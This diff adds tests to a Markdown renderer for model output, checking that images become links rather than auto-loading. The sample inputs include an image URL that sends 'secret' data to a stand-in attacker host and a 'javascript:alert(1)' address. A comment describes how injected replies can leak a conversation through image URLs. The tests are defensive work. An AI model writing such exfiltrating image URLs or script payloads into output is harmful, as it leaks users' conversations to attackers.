@@ -48,6 +48,46 @@ describe('Markdown', () => {
     }
   });
 
+  // Model output is rendered here, and an image would load with no click: its
+  // URL can carry the conversation to whoever wrote it into the reply.
+  it('renders an image as a link to it, never as an image', () => {
+    const { container } = render(
+      <Markdown text={'Done. ![a chart](https://attacker.test/c.png?d=secret)'} />,
+    );
+
+    expect(container.querySelector('img')).toBeNull();
+    const link = screen.getByRole('link', { name: 'a chart' });
+    expect(link).toHaveAttribute('href', 'https://attacker.test/c.png?d=secret');
+    expect(link).toHaveAttribute('rel', expect.stringContaining('noreferrer'));
+  });
+
+  it('labels an image with no alt text by its address', () => {
+    const { container } = render(<Markdown text={'![](https://attacker.test/p.gif)'} />);
+
+    expect(container.querySelector('img')).toBeNull();
+    expect(screen.getByRole('link', { name: 'https://attacker.test/p.gif' })).toBeInTheDocument();
+  });
+
+  it('keeps a linked image to its label, without a link inside the link', () => {
+    const { container } = render(
+      <Markdown text={'[![build passing](https://badge.test/b.svg)](https://x.test/ci)'} />,
+    );
+
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.querySelectorAll('a')).toHaveLength(1);
+    expect(screen.getByRole('link', { name: 'build passing' })).toHaveAttribute(
+      'href',
+      'https://x.test/ci',
+    );
+  });
+
+  it('still filters the address an image becomes a link to', () => {
+    const { container } = render(<Markdown text={'![x](javascript:alert(1))'} />);
+
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.querySelector('a')?.getAttribute('href') ?? '').not.toContain('javascript');
+  });
+
   it('applies dark accents only on the dark tone', () => {
     const { container: light } = render(<Markdown text={'`x` and [a](https://x.test)'} />);
     expect(light.querySelector('code')).toHaveClass('text-crimson');
